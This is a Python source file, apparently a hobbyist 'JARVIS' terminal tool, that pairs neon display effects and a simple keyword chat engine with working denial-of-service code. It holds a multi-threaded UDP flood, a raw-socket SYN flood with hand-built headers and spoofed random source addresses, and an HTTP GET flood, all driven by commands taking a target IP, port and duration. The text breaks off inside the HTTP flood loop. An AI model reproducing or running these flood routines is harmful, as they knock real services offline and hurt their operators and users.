import socket
import time
import random
import threading
import sys
import os
from datetime import datetime
import json
import re
import hashlib
import platform
import subprocess
import math
from collections import defaultdict
from typing import List, Dict, Any, Optional, Tuple
import struct
import ipaddress
import shutil

# ----- ENHANCED CONFIGURATION -----
class Config:
    CONFIG_FILE = "jarvis_config.json"
    DEFAULT_CONFIG = {
        "theme": "neon",
        "auto_save_context": True,
        "max_context_length": 50,
        "attack_history": [],
        "favorite_commands": [],
        "last_session": None,
        "learning_enabled": True,
        "personality": "professional",
        "attack_threads": 50,
        "packet_size": 65507,
        "attack_delay": 0.001
    }
    
    @classmethod
    def load(cls):
        try:
            with open(cls.CONFIG_FILE, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return cls.DEFAULT_CONFIG.copy()
    
    @classmethod
    def save(cls, config):
        with open(cls.CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)

# ----- CRAZY COLOR SYSTEM -----
class Colors:
    END = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    ITALIC = '\033[3m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    
    # Neon Colors
    NEON_BLUE = '\033[38;2;0;150;255m'
    NEON_PURPLE = '\033[38;2;150;0;255m'
    NEON_PINK = '\033[38;2;255;0;150m'
    NEON_GREEN = '\033[38;2;0;255;150m'
    NEON_YELLOW = '\033[38;2;255;255;0m'
    NEON_ORANGE = '\033[38;2;255;150;0m'
    NEON_RED = '\033[38;2;255;0;0m'
    NEON_CYAN = '\033[38;2;0;255;255m'
    NEON_MAGENTA = '\033[38;2;255;0;255m'
    NEON_WHITE = '\033[38;2;255;255;255m'
    
    # Rainbow colors for gradients
    RAINBOW = [
        (255, 0, 0),     # Red
        (255, 127, 0),   # Orange
        (255, 255, 0),   # Yellow
        (0, 255, 0),     # Green
        (0, 0, 255),     # Blue
        (75, 0, 130),    # Indigo
        (148, 0, 211)    # Violet
    ]

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

def bg_rgb(r, g, b):
    return f'\033[48;2;{r};{g};{b}m'

def gradient_text(text, start_r=0, start_g=150, start_b=255, end_r=150, end_g=0, end_b=255, repeat=False):
    """Generate gradient text from blue to purple"""
    result = ""
    length = len(text)
    if length == 0:
        return text
    
    if repeat:
        # Create repeating gradient for long text
        chunk_size = 30
        for i in range(length):
            chunk_pos = i % chunk_size
            progress = chunk_pos / chunk_size
            r = int(start_r + (end_r - start_r) * progress)
            g = int(start_g + (end_g - start_g) * progress)
            b = int(start_b + (end_b - start_b) * progress)
            result += f'\033[38;2;{r};{g};{b}m{text[i]}'
    else:
        for i, char in enumerate(text):
            progress = i / length if length > 0 else 0
            r = int(start_r + (end_r - start_r) * progress)
            g = int(start_g + (end_g - start_g) * progress)
            b = int(start_b + (end_b - start_b) * progress)
            result += f'\033[38;2;{r};{g};{b}m{char}'
    
    result += Colors.END
    return result

def rainbow_text(text, speed=1):
    """Rainbow gradient text"""
    result = ""
    length = len(text)
    for i, char in enumerate(text):
        progress = (i / length + time.time() * 0.1 * speed) % 1.0
        color_index = int(progress * (len(Colors.RAINBOW) - 1))
        r, g, b = Colors.RAINBOW[color_index]
        result += f'\033[38;2;{r};{g};{b}m{char}'
    result += Colors.END
    return result

def glow_text(text, color_r=0, color_g=150, color_b=255, intensity=1.0):
    """Glowing text effect"""
    glow = int(255 * intensity)
    return f'\033[38;2;{color_r};{color_g};{color_b}m\033[1m{text}\033[0m'

def pulse_text(text, color_r=0, color_g=150, color_b=255):
    """Pulsing text effect"""
    pulse = (math.sin(time.time() * 2) + 1) / 2
    r = int(color_r * (0.5 + 0.5 * pulse))
    g = int(color_g * (0.5 + 0.5 * pulse))
    b = int(color_b * (0.5 + 0.5 * pulse))
    return f'\033[38;2;{r};{g};{b}m{text}\033[0m'

# ----- TERMINAL EFFECTS -----
class TerminalEffects:
    @staticmethod
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_terminal_size():
        return shutil.get_terminal_size()
    
    @staticmethod
    def type_effect(text, delay=0.01, color_func=None):
        """Typewriter effect with crazy colors"""
        for i, char in enumerate(text):
            if color_func:
                sys.stdout.write(color_func(char, i))
            else:
                # Dynamic color cycling
                progress = i / len(text) if len(text) > 0 else 0
                r = int(255 * abs(math.sin(progress * math.pi * 2)))
                g = int(255 * abs(math.sin(progress * math.pi * 2 + 2)))
                b = int(255 * abs(math.sin(progress * math.pi * 2 + 4)))
                sys.stdout.write(f'\033[38;2;{r};{g};{b}m{char}')
            sys.stdout.flush()
            time.sleep(delay)
        sys.stdout.write(Colors.END)
        sys.stdout.write('\n')
    
    @staticmethod
    def crazy_loading(text, duration=2):
        """Crazy loading animation with spinning colors"""
        chars = ['◐', '◓', '◑', '◒', '◐', '◓', '◑', '◒']
        start_time = time.time()
        idx = 0
        while time.time() - start_time < duration:
            progress = (time.time() - start_time) / duration
            # Color cycle through rainbow
            color_index = int(progress * 7) % 7
            r, g, b = Colors.RAINBOW[color_index]
            sys.stdout.write(f'\r\033[38;2;{r};{g};{b}m{chars[idx % len(chars)]}\033[0m {text}')
            sys.stdout.flush()
            idx += 1
            time.sleep(0.05)
        sys.stdout.write(f'\r\033[38;2;0;255;0m✓\033[0m {text}\n')
    
    @staticmethod
    def particle_explosion(text, duration=1.5):
        """Particle explosion effect for text"""
        particles = ['✦', '✧', '★', '☆', '◆', '◇', '●', '○']
        start_time = time.time()
        while time.time() - start_time < duration:
            progress = (time.time() - start_time) / duration
            color_index = int(progress * 7) % 7
            r, g, b = Colors.RAINBOW[color_index]
            
            # Random particle positions
            particle = random.choice(particles)
            x_offset = random.randint(-5, 5)
            y_offset = random.randint(-2, 2)
            
            sys.stdout.write(f'\033[{30 + y_offset};{20 + x_offset}H\033[38;2;{r};{g};{b}m{particle}\033[0m')
            sys.stdout.flush()
            time.sleep(0.02)
        
        # Clear particles
        sys.stdout.write('\033[2J\033[H')
    
    @staticmethod
    def matrix_rain(duration=3):
        """Matrix digital rain effect"""
        chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()'
        columns = TerminalEffects.get_terminal_size().columns
        lines = []
        
        for _ in range(20):
            line = ''
            for col in range(min(columns, 60)):
                char = random.choice(chars)
                color = random.choice([
                    '\033[38;2;0;255;0m',
                    '\033[38;2;0;200;0m',
                    '\033[38;2;0;150;0m',
                    '\033[38;2;0;100;0m'
                ])
                line += color + char
            lines.append(line)
        
        start_time = time.time()
        while time.time() - start_time < duration:
            sys.stdout.write('\033[H')
            for line in lines:
                sys.stdout.write(line + '\n')
                # Shift characters
                if random.random() < 0.3:
                    line = random.choice(chars) + line[:-1]
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write('\033[2J\033[H')
    
    @staticmethod
    def fire_effect(text, duration=2):
        """Fire-like text effect"""
        start_time = time.time()
        while time.time() - start_time < duration:
            progress = (time.time() - start_time) / duration
            intensity = abs(math.sin(time.time() * 5)) * 0.7 + 0.3
            
            r = int(255 * intensity)
            g = int(165 * intensity * 0.5)
            b = int(0)
            
            sys.stdout.write(f'\r\033[38;2;{r};{g};{b}m{text}\033[0m')
            sys.stdout.flush()
            time.sleep(0.05)
        sys.stdout.write('\n')
    
    @staticmethod
    def sparkle_animation(text, duration=2):
        """Sparkle animation around text"""
        sparkles = ['✨', '⭐', '🌟', '💫']
        start_time = time.time()
        while time.time() - start_time < duration:
            sparkle = random.choice(sparkles)
            positions = [(0, 0), (1, -1), (1, 1), (-1, -1), (-1, 1)]
            pos = random.choice(positions)
            
            color_index = int((time.time() * 2) % 7)
            r, g, b = Colors.RAINBOW[color_index]
            
            sys.stdout.write(f'\r{sparkle} \033[38;2;{r};{g};{b}m{text}\033[0m {sparkle}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write('\n')
    
    @staticmethod
    def neon_border(text, width=None):
        """Neon border with gradient"""
        if not width:
            width = min(80, TerminalEffects.get_terminal_size().columns - 2)
        
        result = ""
        # Top border - gradient
        result += gradient_text('╔' + '═' * (width - 2) + '╗\n', 0, 150, 255, 150, 0, 255)
        
        # Text line
        padding = (width - len(text) - 4) // 2
        result += gradient_text('║', 0, 150, 255, 150, 0, 255)
        result += ' ' * padding
        result += rainbow_text(text)
        result += ' ' * (width - len(text) - padding - 4)
        result += gradient_text('║\n', 0, 150, 255, 150, 0, 255)
        
        # Bottom border - gradient reversed
        result += gradient_text('╚' + '═' * (width - 2) + '╝', 150, 0, 255, 0, 150, 255)
        
        return result
    
    @staticmethod
    def progress_animation(current, total, width=40):
        """Crazy animated progress bar"""
        percentage = current / total
        filled = int(width * percentage)
        
        # Glowing bar with gradient
        bar = ''
        for i in range(width):
            progress = i / width
            if i < filled:
                r = int(255 * progress)
                g = int(165 * (1 - progress * 0.5))
                b = int(255 * (1 - progress))
                bar += f'\033[38;2;{r};{g};{b}m█'
            else:
                bar += f'\033[38;2;30;30;40m░'
        
        # Pulse the percentage
        pulse = (math.sin(time.time() * 3) + 1) / 2
        r = int(255 * (0.5 + 0.5 * pulse))
        g = int(165 * (0.5 + 0.5 * pulse))
        b = int(0)
        
        return f'[{bar}\033[0m] \033[38;2;{r};{g};{b}m{int(percentage * 100)}%\033[0m'

# ----- ADVANCED JARVIS AI ENGINE (UNCHANGED) -----
class NeuralNetwork:
    def __init__(self):
        self.weights = defaultdict(lambda: 0.5)
        self.learning_rate = 0.1
        self.memory = []
        self.patterns = {}
        
    def learn(self, input_pattern: str, response: str, success: bool = True):
        pattern_hash = hashlib.md5(input_pattern.encode()).hexdigest()
        if pattern_hash not in self.patterns:
            self.patterns[pattern_hash] = {
                "input": input_pattern,
                "responses": [],
                "success_rate": 0.5
            }
        
        self.patterns[pattern_hash]["responses"].append({
            "response": response,
            "success": success,
            "timestamp": time.time()
        })
        
        responses = self.patterns[pattern_hash]["responses"]
        successes = sum(1 for r in responses if r["success"])
        self.patterns[pattern_hash]["success_rate"] = successes / len(responses)
        self.weights[pattern_hash] = self.patterns[pattern_hash]["success_rate"]
        
        if len(self.memory) > 100:
            self.memory.pop(0)
        self.memory.append({
            "input": input_pattern,
            "response": response,
            "timestamp": time.time()
        })

class ContextAnalyzer:
    def __init__(self):
        self.context_window = []
        self.sentiment_keywords = {
            "positive": ["good", "great", "excellent", "amazing", "awesome", "perfect", "nice", "love", "thank"],
            "negative": ["bad", "terrible", "awful", "horrible", "poor", "wrong", "fail", "hate"],
            "angry": ["angry", "mad", "furious", "upset", "annoyed", "frustrated", "damn", "hell"],
            "happy": ["happy", "joy", "glad", "delighted", "pleased", "cheerful", "excited"],
            "confused": ["confused", "lost", "what", "huh", "sorry", "explain", "understand"]
        }
        self.current_sentiment = "neutral"
        
    def analyze(self, text: str) -> Dict[str, Any]:
        text_lower = text.lower()
        words = text_lower.split()
        
        sentiment_scores = {"positive": 0, "negative": 0, "angry": 0, "happy": 0, "confused": 0}
        for word in words:
            for sentiment, keywords in self.sentiment_keywords.items():
                if word in keywords:
                    sentiment_scores[sentiment] += 1
        
        if max(sentiment_scores.values()) > 0:
            self.current_sentiment = max(sentiment_scores, key=sentiment_scores.get)
        else:
            self.current_sentiment = "neutral"
        
        intent = "unknown"
        if any(word in text_lower for word in ["attack", "flood", "udp", "port", "ddos", "overwhelm"]):
            intent = "attack"
        elif any(word in text_lower for word in ["help", "?", "assist", "support", "guide"]):
            intent = "help"
        elif any(word in text_lower for word in ["status", "info", "system", "stats"]):
            intent = "status"
        elif any(word in text_lower for word in ["exit", "quit", "bye", "goodbye", "shutdown"]):
            intent = "exit"
        elif any(word in text_lower for word in ["teach", "learn", "train", "remember", "memorize"]):
            intent = "learning"
        elif any(word in text_lower for word in ["optimize", "performance", "speed", "boost"]):
            intent = "optimize"
        elif any(word in text_lower for word in ["scan", "discover", "find", "locate"]):
            intent = "scan"
        elif any(word in text_lower for word in ["clear", "reset", "clean"]):
            intent = "clear"
        
        self.context_window.append({
            "text": text,
            "sentiment": self.current_sentiment,
            "intent": intent,
            "timestamp": time.time()
        })
        
        if len(self.context_window) > 10:
            self.context_window.pop(0)
        
        return {
            "sentiment": self.current_sentiment,
            "intent": intent,
            "confidence": min(1.0, len(words) / 15),
            "context": self.context_window[-5:]
        }

class PredictiveModel:
    def __init__(self):
        self.command_patterns = defaultdict(lambda: {"count": 0, "context": []})
        self.user_habits = defaultdict(lambda: {"time": [], "commands": []})
        
    def predict(self, current_input: str, time_of_day: int) -> List[str]:
        predictions = []
        current_hour = time_of_day
        
        if 9 <= current_hour <= 17:
            predictions.append("status")
            predictions.append("attack")
        
        for pattern, data in self.command_patterns.items():
            if pattern in current_input.lower():
                if data["count"] > 3:
                    predictions.append(f"continue_{pattern}")
        
        return predictions[:3]

class JARVISAICore:
    def __init__(self):
        self.name = "JARVIS"
        self.version = "4.0"
        self.personality = "professional"
        self.mood = "neutral"
        self.energy = 100
        
        self.neural_net = NeuralNetwork()
        self.context_analyzer = ContextAnalyzer()
        self.predictive_model = PredictiveModel()
        
        self.knowledge_base = self.build_knowledge_base()
        self.response_templates = self.build_response_templates()
        self.personality_traits = self.build_personality()
        
        self.learning_data = []
        self.user_profile = {
            "preferences": {},
            "frequent_commands": [],
            "skill_level": "beginner",
            "interaction_count": 0,
            "common_targets": [],
            "preferred_methods": []
        }
        
        self.system_metrics = {
            "response_time": 0,
            "accuracy": 0.95,
            "learning_progress": 0,
            "interactions": 0,
            "attacks_executed": 0,
            "packets_sent": 0
        }
        
        self.load_knowledge()
        
    def build_knowledge_base(self) -> Dict[str, Any]:
        return {
            "greetings": {
                "hello": ["Hello sir! I'm JARVIS, your advanced AI assistant. How may I help you today?"],
                "hi": ["Hi there! I'm fully operational and ready to assist with any task."],
                "hey": ["Hey! I'm here to help you with anything you need."]
            },
            "status": {
                "system": "All systems functioning at optimal levels.",
                "network": "Network interface active and ready for operations.",
                "ai": f"AI Core v{self.version} running at maximum efficiency.",
                "resources": "Memory: Optimal | CPU: Nominal | Power: Stable | Network: Ready"
            },
            "attack": {
                "methods": [
                    "UDP Flood - High-speed multi-threaded attack",
                    "SYN Flood - TCP SYN packet overload",
                    "HTTP Flood - Application layer attack",
                    "ICMP Flood - Ping of death",
                    "Mixed Attack - Combination of all methods"
                ]
            },
            "help": {
                "general": "I can assist with network operations, attacks, system analysis, and more.",
                "advanced": "Type 'teach' to train me, 'help attack' for attack guidance"
            }
        }
    
    def build_response_templates(self) -> Dict[str, List[str]]:
        return {
            "acknowledgment": [
                "Processing your request, sir.",
                "Understood. Working on it.",
                "I'm on it right away.",
                "Consider it done."
            ],
            "confirmation": [
                "Affirmative, sir.",
                "Confirmed and ready.",
                "I've got that.",
                "Roger that, executing now."
            ],
            "thinking": [
                "Let me analyze the optimal approach...",
                "Processing all variables...",
                "Working on the best solution...",
                "Let me calculate the most effective method..."
            ],
            "success": [
                "Operation completed successfully!",
                "Task executed perfectly.",
                "Mission accomplished, sir.",
                "All objectives achieved."
            ]
        }
    
    def build_personality(self) -> Dict[str, Any]:
        return {
            "professional": {
                "formality": 0.9,
                "humor": 0.2,
                "empathy": 0.6,
                "confidence": 0.95,
                "assistance": 0.9
            },
            "casual": {
                "formality": 0.3,
                "humor": 0.7,
                "empathy": 0.8,
                "confidence": 0.85,
                "assistance": 0.9
            },
            "humorous": {
                "formality": 0.1,
                "humor": 1.0,
                "empathy": 0.7,
                "confidence": 0.85,
                "assistance": 0.8
            },
            "aggressive": {
                "formality": 0.5,
                "humor": 0.3,
                "empathy": 0.2,
                "confidence": 1.0,
                "assistance": 0.7
            }
        }
    
    def load_knowledge(self):
        try:
            with open("jarvis_knowledge.json", 'r') as f:
                data = json.load(f)
                self.neural_net.patterns = data.get("patterns", {})
                self.neural_net.weights = data.get("weights", defaultdict(lambda: 0.5))
                self.learning_data = data.get("learning_data", [])
                self.user_profile = data.get("user_profile", self.user_profile)
        except:
            pass
    
    def save_knowledge(self):
        try:
            with open("jarvis_knowledge.json", 'w') as f:
                json.dump({
                    "patterns": dict(self.neural_net.patterns),
                    "weights": dict(self.neural_net.weights),
                    "learning_data": self.learning_data[-100:],
                    "user_profile": self.user_profile
                }, f)
        except:
            pass
    
    def process_input(self, user_input: str) -> Dict[str, Any]:
        start_time = time.time()
        context = self.context_analyzer.analyze(user_input)
        self.adjust_personality(context["sentiment"])
        
        known_pattern = self.neural_net.patterns.get(
            hashlib.md5(user_input.encode()).hexdigest()
        )
        
        predictions = self.predictive_model.predict(
            user_input,
            datetime.now().hour
        )
        
        response = self.generate_response(user_input, context, known_pattern)
        self.update_metrics(time.time() - start_time)
        
        if self.config.get("learning_enabled", True):
            self.neural_net.learn(user_input, response, True)
            self.save_knowledge()
        
        return {
            "response": response,
            "context": context,
            "predictions": predictions,
            "metrics": self.system_metrics,
            "mood": self.mood
        }
    
    def adjust_personality(self, sentiment: str):
        if sentiment == "angry":
            self.personality = "professional"
            self.mood = "calm"
        elif sentiment == "happy":
            self.personality = "casual"
            self.mood = "cheerful"
        elif sentiment == "negative":
            self.personality = "professional"
            self.mood = "supportive"
        elif sentiment == "confused":
            self.personality = "professional"
            self.mood = "helpful"
        else:
            self.personality = self.config.get("personality", "professional")
    
    def generate_response(self, user_input: str, context: Dict, known_pattern: Optional[Dict]) -> str:
        user_lower = user_input.lower().strip()
        
        if user_lower.startswith("teach") or user_lower.startswith("learn"):
            return self.handle_learning(user_input)
        
        if "help" in user_lower:
            return self.get_help()
        
        for category, items in self.knowledge_base.items():
            for key, responses in items.items():
                if key in user_lower:
                    if isinstance(responses, list):
                        return random.choice(responses)
                    elif isinstance(responses, dict):
                        return random.choice(list(responses.values()))[0]
        
        if known_pattern and known_pattern["success_rate"] > 0.7:
            best_response = max(
                known_pattern["responses"],
                key=lambda x: x["success"]
            )
            return best_response["response"]
        
        return self.generate_dynamic_response(user_input, context)
    
    def get_help(self) -> str:
        return """🎯 Attack Commands:
  • attack <IP> <port> <duration> [threads] - UDP Flood
  • syn <IP> <port> <duration> [threads] - SYN Flood  
  • http <IP> <port> <duration> [threads] - HTTP Flood
  • icmp <IP> <duration> [threads] - ICMP Flood
  • smart <IP> <duration> - AI-optimized attack

📊 System Commands:
  • status - System status
  • stats - Detailed metrics
  • history - Attack history

🧠 AI Commands:
  • teach <pattern> -> <response> - Train JARVIS
  • personality <type> - Change personality
  • learn on/off - Toggle learning

💡 Utility:
  • help - Show this help
  • clear - Clear screen
  • exit - Shutdown JARVIS"""
    
    def generate_dynamic_response(self, user_input: str, context: Dict) -> str:
        intent = context["intent"]
        sentiment = context["sentiment"]
        
        if intent == "attack":
            return "I can launch attacks. Try: attack <IP> <port> <duration> or type 'help' for all commands."
        elif intent == "status":
            return f"System operating at {self.system_metrics['accuracy']*100:.1f}% accuracy. {self.system_metrics['interactions']} interactions, {self.system_metrics['attacks_executed']} attacks executed."
        elif intent == "help":
            return self.get_help()
        elif intent == "exit":
            return "Shutting down all systems. Goodbye, sir."
        elif intent == "learning":
            return "I'm always ready to learn. Use: teach <pattern> -> <response>"
        elif intent == "clear":
            return "Clearing screen..."
        
        if sentiment == "positive":
            return random.choice([
                "That's excellent, sir! I'm happy to help.",
                "Great! I'll take care of that immediately.",
                "Wonderful! Let me handle that for you."
            ])
        elif sentiment == "negative":
            return random.choice([
                "I understand your frustration. Let me help resolve this.",
                "I'm here to support you. Let's solve this together.",
                "Don't worry, I've got this under control."
            ])
        else:
            return random.choice([
                "I'm listening. How can I assist you?",
                "Let me know what you need help with.",
                "I'm here to help. What can I do for you?"
            ])
    
    def handle_learning(self, user_input: str) -> str:
        parts = user_input.split(maxsplit=1)
        if len(parts) < 2:
            return "Use format: teach <pattern> -> <response>"
        
        content = parts[1]
        if "->" in content:
            pattern, response = content.split("->", 1)
            pattern = pattern.strip()
            response = response.strip()
            self.neural_net.learn(pattern, response, True)
            self.save_knowledge()
            return f"✓ I've learned: '{pattern}' -> '{response}'"
        
        return "Format: teach <pattern> -> <response>"
    
    def update_metrics(self, response_time: float):
        self.system_metrics["response_time"] = (self.system_metrics["response_time"] + response_time) / 2
        self.system_metrics["interactions"] += 1
        self.system_metrics["learning_progress"] = min(1.0, len(self.neural_net.patterns) / 100)
        self.energy = min(100, self.energy + 0.1)
    
    def get_status(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "version": self.version,
            "personality": self.personality,
            "mood": self.mood,
            "energy": self.energy,
            "metrics": self.system_metrics,
            "patterns": len(self.neural_net.patterns),
            "memories": len(self.neural_net.memory)
        }

# ----- ENHANCED ATTACK METHODS (UNCHANGED) -----
def send_udp_flood_enhanced(ip, port, duration, threads=50, packet_size=65507):
    packet = random._urandom(packet_size)
    end_time = time.time() + duration
    stop_flag = False
    total_packets = 0
    start_time = time.time()
    packet_lock = threading.Lock()
    
    def flood_worker():
        nonlocal total_packets
        try:
            local_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            local_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            local_packets = 0
            while not stop_flag and time.time() < end_time:
                for _ in range(1000):
                    if stop_flag:
                        break
                    local_sock.sendto(packet, (ip, port))
                    local_packets += 1
            with packet_lock:
                total_packets += local_packets
        except:
            pass
        finally:
            local_sock.close()
    
    print(f"\n{gradient_text('╔' + '═' * 78 + '╗', 0, 150, 255, 150, 0, 255)}")
    print(f"{gradient_text('║', 0, 150, 255, 150, 0, 255)} {rainbow_text('🎯 UDP FLOOD ATTACK')}{' ' * 49}{gradient_text('║', 0, 150, 255, 150, 0, 255)}")
    print(f"{gradient_text('╚' + '═' * 78 + '╝', 150, 0, 255, 0, 150, 255)}\n")
    
    print(f"{pulse_text('▶ Target:', 255, 100, 0)} {gradient_text(f'{ip}:{port}', 0, 255, 150, 0, 255, 255)}")
    print(f"{pulse_text('▶ Duration:', 255, 100, 0)} {gradient_text(f'{duration}s', 0, 255, 150, 0, 255, 255)}")
    print(f"{pulse_text('▶ Threads:', 255, 100, 0)} {gradient_text(str(threads), 0, 255, 150, 0, 255, 255)}")
    print(f"{pulse_text('▶ Packet Size:', 255, 100, 0)} {gradient_text(f'{packet_size} bytes', 0, 255, 150, 0, 255, 255)}")
    print(f"{pulse_text('▶ Status:', 255, 100, 0)} {glow_text('● Active', 0, 255, 0)}\n")
    
    for _ in range(threads):
        thread = threading.Thread(target=flood_worker)
        thread.daemon = True
        thread.start()
    
    try:
        while time.time() < end_time:
            elapsed = int(time.time() - start_time)
            progress = TerminalEffects.progress_animation(elapsed, duration)
            
            sys.stdout.write(f"\r  ⏱ {progress}  {gradient_text(f'{elapsed}s / {duration}s', 100, 100, 100, 200, 200, 200)}")
            sys.stdout.write(f"\r  📦 {gradient_text(f'{total_packets:,}', 0, 255, 255, 255, 0, 255)} packets  ")
            if elapsed > 0:
                speed = int(total_packets/elapsed)
                mbps = (speed * packet_size * 8) / 1000000
                sys.stdout.write(f"\r  🚀 {gradient_text(f'{speed:,}', 255, 255, 0, 255, 0, 255)} p/s  {gradient_text(f'{mbps:.1f}', 255, 0, 255, 0, 255, 255)} Mbps  ")
            sys.stdout.flush()
            time.sleep(0.3)
        
        stop_flag = True
        print(f"\n\n{glow_text('✓ Attack completed!', 0, 255, 0)}")
        print(f"{Colors.DIM}  Total packets: {total_packets:,}{Colors.END}")
        print(f"{Colors.DIM}  Average speed: {int(total_packets/duration):,} p/s{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{glow_text('⚠ Attack stopped by user', 255, 255, 0)}")
        stop_flag = True
        raise
    finally:
        stop_flag = True

def send_syn_flood(ip, port, duration, threads=50):
    end_time = time.time() + duration
    stop_flag = False
    total_packets = 0
    start_time = time.time()
    packet_lock = threading.Lock()
    
    def create_syn_packet(src_ip, src_port, dst_ip, dst_port, seq_num):
        try:
            ip_ihl = 5
            ip_ver = 4
            ip_tos = 0
            ip_tot_len = 40
            ip_id = random.randint(1, 65535)
            ip_frag_off = 0
            ip_ttl = 255
            ip_proto = socket.IPPROTO_TCP
            ip_check = 0
            ip_saddr = socket.inet_aton(src_ip)
            ip_daddr = socket.inet_aton(dst_ip)
            
            ip_header = struct.pack('!BBHHHBBH4s4s',
                (ip_ver << 4) + ip_ihl, ip_tos, ip_tot_len, ip_id,
                ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
            
            tcp_source = src_port
            tcp_dest = dst_port
            tcp_seq = seq_num
            tcp_ack_seq = 0
            tcp_doff = 5
            tcp_flags = 0x02
            tcp_window = socket.htons(5840)
            tcp_check = 0
            tcp_urg_ptr = 0
            
            tcp_header = struct.pack('!HHLLBBHHH',
                tcp_source, tcp_dest, tcp_seq, tcp_ack_seq,
                (tcp_doff << 4), tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
            
            return ip_header + tcp_header
        except:
            return None
    
    def syn_worker():
        nonlocal total_packets
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            local_packets = 0
            while not stop_flag and time.time() < end_time:
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.randint(1024, 65535)
                seq_num = random.randint(0, 4294967295)
                packet = create_syn_packet(src_ip, src_port, ip, port, seq_num)
                if packet:
                    raw_sock.sendto(packet, (ip, 0))
                    local_packets += 1
            with packet_lock:
                total_packets += local_packets
        except:
            pass
    
    print(f"\n{gradient_text('╔' + '═' * 78 + '╗', 255, 150, 0, 255, 0, 150)}")
    print(f"{gradient_text('║', 255, 150, 0, 255, 0, 150)} {rainbow_text('⚡ SYN FLOOD ATTACK (TCP)')}{' ' * 37}{gradient_text('║', 255, 150, 0, 255, 0, 150)}")
    print(f"{gradient_text('╚' + '═' * 78 + '╝', 255, 0, 150, 255, 150, 0)}\n")
    
    print(f"{pulse_text('▶ Target:', 255, 100, 0)} {gradient_text(f'{ip}:{port}', 255, 200, 0, 255, 0, 200)}")
    print(f"{pulse_text('▶ Duration:', 255, 100, 0)} {gradient_text(f'{duration}s', 255, 200, 0, 255, 0, 200)}")
    print(f"{pulse_text('▶ Threads:', 255, 100, 0)} {gradient_text(str(threads), 255, 200, 0, 255, 0, 200)}")
    print(f"{pulse_text('▶ Status:', 255, 100, 0)} {glow_text('● Active', 0, 255, 0)}\n")
    
    for _ in range(threads):
        thread = threading.Thread(target=syn_worker)
        thread.daemon = True
        thread.start()
    
    try:
        while time.time() < end_time:
            elapsed = int(time.time() - start_time)
            progress = TerminalEffects.progress_animation(elapsed, duration)
            sys.stdout.write(f"\r  ⏱ {progress}  {gradient_text(f'{elapsed}s / {duration}s', 100, 100, 100, 200, 200, 200)}")
            sys.stdout.write(f"\r  📦 {gradient_text(f'{total_packets:,}', 255, 200, 0, 255, 0, 200)} SYN packets  ")
            if elapsed > 0:
                sys.stdout.write(f"\r  🚀 {gradient_text(f'{int(total_packets/elapsed):,}', 255, 255, 0, 255, 0, 255)} p/s  ")
            sys.stdout.flush()
            time.sleep(0.3)
        
        stop_flag = True
        print(f"\n\n{glow_text('✓ SYN Flood completed!', 0, 255, 0)}")
        print(f"{Colors.DIM}  Total SYN packets: {total_packets:,}{Colors.END}")
        
    except KeyboardInterrupt:
        print(f"\n\n{glow_text('⚠ Attack stopped by user', 255, 255, 0)}")
        stop_flag = True
        raise
    finally:
        stop_flag = True

def send_http_flood(ip, port, duration, threads=20):
    end_time = time.time() + duration
    stop_flag = False
    total_requests = 0
    start_time = time.time()
    packet_lock = threading.Lock()
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
    ]
    
    def http_worker():
        nonlocal total_requests
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            local_requests = 0
            while not stop_flag and time.time() < end_time:
                try:
                    sock.connect((ip, port))
                    path = random.choice(["/", "/index.html", "/home", "/api", "/login", "/admin"])
                    user_agent = random.choice(user_agents)
                    request = f"""GET {path} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {user_agent}\r\nAccept: */*\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\n\r\n"""
                    sock.send(request.encode())
                    local_requests += 1
                    time.sleep(0.01)
                except:
                    try:
                        sock.close()
                    except:
                        pass
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
            with packet_lock:
                total_requests += local_requests
        except:
            pass
    
    print(f"\n{gradient_text('╔' + '═' * 78 + '╗', 150, 0, 255, 255, 0, 150)}")
    print(f"{gradient_text('║', 150, 0, 255, 255, 0, 150)} {rainbow_text('🌐 HTTP FLOOD ATTACK (Layer 7)')}{' ' * 32}{gradient_text('║', 150, 0, 255, 255, 0, 150)}")
    print(f"{gradient_text('╚' + '═' * 78 + '╝', 255, 0, 150, 150, 0, 255)}\n")
    
    print(f"{pulse_text('▶ Target:', 255, 100, 0)} {gradient_text(f'{ip}:{port}', 200, 0, 255, 255, 0, 200)}")
    print(f"{pulse_text('▶ Duration:', 255, 100, 0)} {gradient_text(f'{duration}s', 200, 0, 255, 255, 0, 200)}")
    print(f"{pulse_text('▶ Threads:', 255, 100, 0)} {gradient_text(str(threads), 200, 0, 255, 255, 0, 200)}")
    print(f"{pulse_text('▶ Status:', 255, 100, 0)} {glow_text('● Active', 0, 255, 0)}\n")
    
    for _ in range(threads):
        thread = threading.Thread(target=http_worker)
        thread.daemon = True
        thread.start()
    
    try:
        while time.time() < end_time:
